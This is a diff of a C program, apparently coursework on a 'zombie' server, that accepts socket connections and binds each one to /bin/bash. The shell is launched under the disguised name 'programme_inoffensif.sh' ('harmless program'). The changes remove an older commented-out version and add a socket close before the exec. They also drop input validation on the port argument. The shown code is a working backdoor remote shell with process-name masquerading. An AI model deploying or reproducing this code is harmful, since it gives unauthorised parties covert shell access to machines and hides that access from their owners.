@@ -10,37 +10,6 @@
 #include "utils_v2.h"
 #include "network.h"
 
-/*
-void startShell(int socketFD)
-{
-  pid_t pid = fork();
-
-  if (pid == -1)
-  {
-    perror("fork() error");
-    return;
-  }
-
-  if (pid == 0)
-  {
-    dup2(socketFD, STDIN_FILENO);
-    dup2(socketFD, STDOUT_FILENO);
-    dup2(socketFD, STDERR_FILENO);
-
-    //char *args[] = {"bash", "-c", "exec -a programme_inoffensif /bin/bash", NULL};
-    //execve("/bin/bash", args, NULL);
-    sexecl("/bin/bash", "programme_inoffensif.sh", NULL);
-  }
-
-  else
-  {
-    int status;
-    waitpid(pid, &status, 0);
-  }
-
-}
-*/
-
 void startShell(void *arg)
 {
   int socketFD = *(int*)arg;
@@ -48,15 +17,15 @@ void startShell(void *arg)
   dup2(socketFD, STDOUT_FILENO);
   dup2(socketFD, STDERR_FILENO);
 
-  // char *args[] = {"bash", "-c", "exec -a programme_inoffensif /bin/bash", NULL};
-  // execve("/bin/bash", args, NULL);
+  sclose(socketFD);
+  
   sexecl("/bin/bash", "programme_inoffensif.sh", NULL);
 }
 
 int getPort(int nbArg, const char *const tabArg[])
 {
   int port;
-  if (nbArg > 1 && isdigit(tabArg[1]))
+  if (nbArg > 1)
   {
     port = atoi(tabArg[1]);
   }
@@ -89,10 +58,4 @@ int main(int argc, char const *argv[])
     fork_and_run1(startShell,&socketForThisAccept);
     //startShell(socketForThisAccept);
   }
-
-  // Ces printf sont inutiles mais c'est pour eviter de dire que ces variables sont declarées mais pas utilisées dans zombie
-  // Sinon ca compile pas
-  printf("%d", nbrSockFD);
-  printf("%d", sockFdPortsConnectedTab[0]);
-  return 0;
 }
